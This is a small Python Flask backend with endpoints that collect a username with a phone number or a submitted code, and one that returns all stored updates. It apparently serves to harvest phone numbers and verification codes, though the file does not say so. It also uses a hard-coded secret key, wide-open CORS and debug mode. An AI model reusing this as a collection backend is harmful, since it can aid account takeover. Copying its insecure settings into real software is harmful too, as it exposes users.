from flask import Flask, request, render_template, redirect, url_for, session, make_response, jsonify
from flask_cors import CORS 
from base import *
import shutil

terminal_width = shutil.get_terminal_size().columns
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
CORS(app) 

@app.route('/update', methods = ['GET'])
def update():
    z = give_all_update()
    if z:
        return jsonify({'update': z}), 200
    return

@app.route('/code', methods = ['POST'])
def code():
    data = request.get_json()
    user = data.get('username')
    code = data.get('code')
    print(user, code)
    if user and code:
        add_code(code, user)
        return jsonify({'status': 200, 'message': 'Код принят'})  # <- Добавили status
    else:
        return jsonify({'message': 'Просто дерьмище'}), 401


@app.route('/phone', methods = ['POST'])
def phone():
    data = request.get_json()
    user = data.get('username')
    phone = data.get('phone')
    print(user, phone)
    if user and phone:
        add_phone(phone, user)
        return jsonify({'message': 'dalbaeb'}), 200
    else:
        return jsonify({'message': 'Просто дерьмище'}), 401

@app.route('/', methods=['GET'])
def main():
    html = 'index.html'
    return render_template(html)

if __name__ == '__main__':
    app.run(debug=True) 
